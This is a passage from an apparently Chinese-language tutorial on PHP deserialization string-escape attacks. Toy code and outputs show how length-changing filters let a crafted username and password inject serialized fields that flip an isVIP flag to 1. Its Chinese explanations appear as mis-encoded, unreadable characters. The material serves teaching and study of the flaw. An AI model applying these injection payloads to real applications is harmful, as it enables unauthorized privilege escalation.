</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hacker&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#39;</span><span class="p">,</span><span class="s1">&#39;123456&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter_unseri</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a_seri_filter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a_seri_filter_unseri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">object(user)#2 (3) {
</span></span><span class="line"><span class="cl">  [&#34;username&#34;]=&gt;
</span></span><span class="line"><span class="cl">  string(282) &#34;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&#34;
</span></span><span class="line"><span class="cl">  [&#34;password&#34;]=&gt;
</span></span><span class="line"><span class="cl">  string(6) &#34;123456&#34;
</span></span><span class="line"><span class="cl">  [&#34;isVIP&#34;]=&gt;
</span></span><span class="line"><span class="cl">  int(1)
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="å­—ç¬¦ä¸²è¾ƒå°‘å®ä¾‹">å­—ç¬¦ä¸²è¾ƒå°‘å®ä¾‹</h5>
<p>ç›®æ ‡ï¼šå°†isVIPå˜é‡çš„å€¼ä¿®æ”¹ä¸º1</p>
<p>å¢åŠ å¯¹adminå­—ç¬¦è¿›è¡Œæ›¿æ¢çš„å‡½æ•°ï¼Œå°†adminæ›¿æ¢ä¸ºhack</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hack&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;123456&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;hack&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›®æ ‡å­—ä¸²å’Œç°æœ‰å­—ä¸²æ¯”è¾ƒ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}	// ç°æœ‰å­ä¸²
</span></span><span class="line"><span class="cl">&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}	// ç›®æ ‡å­ä¸²ï¼Œé•¿åº¦ä¸º47
</span></span><span class="line"><span class="cl">&#34;;s:8:&#34;password&#34;;s:6:&#34; //ä¸‹ä¸€ä¸ªå¯æ§å˜é‡å­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸º22
</span></span><span class="line"><span class="cl">å› ä¸ºè¿‡æ»¤æ—¶ï¼Œadminå˜ä¸ºhackï¼Œæ¯å‡ºç°ä¸€æ¬¡adminï¼Œå°±ä¼šå‡å°‘ä¸€ä¸ªå­—ç¬¦ï¼Œå’Œä¸Šé¢å­—ç¬¦å˜å¤šçš„æƒ…å†µç›¸åï¼Œéšç€adminçš„æ•°é‡å¢å¤šï¼Œç°æœ‰å­ä¸²åé¢ä¼šé€æ¸ç¼©çŸ­ã€‚
</span></span><span class="line"><span class="cl">å› ä¸ºæ¯æ¬¡è¿‡æ»¤çš„æ—¶å€™éƒ½ä¼šå°‘1ä¸ªå­—ç¬¦ï¼Œå› æ­¤å°†adminå­—ç¬¦é‡å¤22éï¼Œä½¿å¾—ä¸‹ä¸€ä¸ªå¯æ§å˜é‡å­—ç¬¦ä¸²ï¼ˆè¿™é‡Œçš„22éå¹¶ä¸ä¸€å®šå‡†ç¡®ï¼Œå› ä¸ºæœ‰åŒå¼•å·çš„å¹²æ‰°ï¼‰
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hack&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;</span><span class="p">,</span><span class="s1">&#39;123456&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:110:&#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">såé¢æ˜¯110ï¼Œéœ€è¦è¯»å–åˆ°110ä¸ªå­—ç¬¦
</span></span><span class="line"><span class="cl">ä»ç¬¬ä¸€ä¸ªå¼•å·å¼€å§‹ï¼Œ110ä¸ªå­—ç¬¦å¦‚ä¸‹ï¼š
</span></span><span class="line"><span class="cl">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:6:&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">123456è¿™ä¸ªä½ç½®å˜æˆå¯æ§å˜é‡ï¼Œåœ¨è¿™é‡Œæ·»åŠ ç›®æ ‡å­ä¸²&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>PHPååºåˆ—åŒ–çš„æœºåˆ¶ï¼šä¸æ ¹æ®åŒå¼•å·åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å·²ç»ç»“æŸï¼Œè€Œæ˜¯æ ¹æ®å‰é¢è§„å®šçš„æ•°é‡è¯»å–å­—ç¬¦ä¸²ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‰é¢æ˜¯è§„å®šäº†æœ‰10ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åªè¯»åˆ°äº†9ä¸ªå°±åˆ°äº†åŒå¼•å·ï¼Œæ­¤æ—¶PHPä¼šæŠŠåŒå¼•å·å½“åšç¬¬10ä¸ªå­—ç¬¦ã€‚</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hack&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:110:&#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:47:&#34;&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:47:&#34;
</span></span><span class="line"><span class="cl">æ­¤æ®µå­—ç¬¦é•¿åº¦ä¸º111
</span></span><span class="line"><span class="cl">åŸå› ï¼šæ›¿æ¢ä¹‹å‰ç›®æ ‡å­ä¸²çš„ä½ç½®æ˜¯123456ï¼Œä¸€å…±6ä¸ªå­—ç¬¦ï¼Œæ›¿æ¢ä¹‹åç›®æ ‡å­ä¸²47ä¸ªå­—ç¬¦ï¼Œä¼šé€ æˆè®¡ç®—çš„payloadä¸å‡†ç¡®
</span></span><span class="line"><span class="cl">è§£å†³åŠæ³•ï¼šå¤šæ·»åŠ 1ä¸ªadminï¼Œè¡¥ä¸Šç¼ºå°‘çš„å­—ç¬¦ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">user</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$isVIP</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$u</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isVIP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;hack&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">user</span><span class="p">(</span><span class="s1">&#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a_seri_filter</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$a_seri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a_seri_filter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è¾“å‡ºç»“æœï¼š
</span></span><span class="line"><span class="cl">O:4:&#34;user&#34;:3:{s:8:&#34;username&#34;;s:115:&#34;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&#34;;s:8:&#34;password&#34;;s:47:&#34;&#34;;s:8:&#34;password&#34;;s:6:&#34;123456&#34;;s:5:&#34;isVIP&#34;;i:1;}&#34;;s:5:&#34;isVIP&#34;;i:0;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†åºåˆ—åŒ–ç»“æœå†ååºåˆ—åŒ–ä¹‹åï¼Œè¾“å‡ºæ£€æŸ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
